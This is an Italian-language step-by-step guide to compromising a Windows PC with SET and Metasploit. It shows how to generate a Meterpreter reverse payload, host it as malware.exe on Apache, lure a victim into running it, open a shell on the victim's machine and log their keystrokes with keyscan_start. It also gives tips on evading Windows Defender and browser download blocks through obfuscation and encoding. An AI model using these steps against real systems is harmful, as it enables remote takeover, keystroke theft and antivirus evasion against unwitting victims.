Considerazioni:
Attenzione a:
-Firewall sia di Kali sia del pc vittima per l'accesso al web server.

-Windows Defender per eventuale blocco del file, in questo esempio tramite setoolkit abbiamo una potente AV evasion e di conseguenza in alcune versioni di windows il payload.exe potrebbe passare inosservato. Cosa che sicuramente non succederà in caso ci sia installato un agente XDR/EDR

-Impostazioni del browser vittima, alcuni browser (tipo chrome) potrebbero bloccare di default le installazioni di .exe in quel caso si deve per forza attuare altri metodi di obfuscation per passare come .js o altro ed eventualmente funzioni di encoding come shikata -i x.

-Ovviamente se non esponiamo il sito web ad internet bisogna avere Kali e windows sulla stessa sottorete. Ifconfig per controllare su Kali e ipconfig per windows. Se state virtualizzando una delle due basta attivare dalle impostazioni di rete la modalità "bridged".

1)sudo setoolkit

2) scegliere i vari metodi elencati: Social engineering, reverse payload, metepreter su windows x64 in questo caso.

3) imposta host, porta ecc, attivando il listener.

4) start un server web, service apache2 start

5) copiamo il malware.exe (situato in /root/.set) sul server web (var/www/html dandogli il nome che preferiamo quindi
cp /root/.set/payload.exe /var/www/html/malware.exe

6) Accesso al sito web con download malevolo con pc vittima: <IP attaccante>/nomecaricato.

7) Dopo aver eseguito il file sul pc vittima, se tutto ha funzionato notiamo da Kali che una sessione meterpreter è iniziata, vediamo l'id della macchina e altre info scrivendo sessions -l

8) con sessions -i <idvittima> ci entriamo dentro tramite meterpreter.

9) a questo punto si può fare di tutto, cercate documentazione ufficiale o fatevi aiutare da un LLM, qui due esempi:

10) shell (ci connette direttamente sulla directory root del pc vittima potendoci muovere in piena libertà come se fossimo noi in controllo del pc)

11) keyscan_start fa partire un keylogger, tramite keyscan_dump vediamo tutto ciò che viene scritto/cancellato.

12) Have fun :)